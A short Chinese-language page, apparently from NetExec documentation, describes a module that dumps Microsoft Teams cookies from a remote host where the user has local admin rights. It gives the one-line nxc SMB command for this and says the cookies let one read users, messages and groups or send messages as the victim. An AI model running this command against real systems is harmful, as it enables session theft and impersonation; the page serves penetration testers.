# 窃取 Microsoft Teams Cookies

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限
{% endhint %}

感谢 [@KuiilSec](https://twitter.com/KuiilSec) 的贡献，这是一个新的 NetExec 模块，用于导出 Microsoft Teams cookies。

你可以使用这些 cookies 来获取用户、消息、群组等信息，或直接在 Teams 中发送消息。

```
$ nxc smb <ip> -u user -p pass -M teams_localdb
```
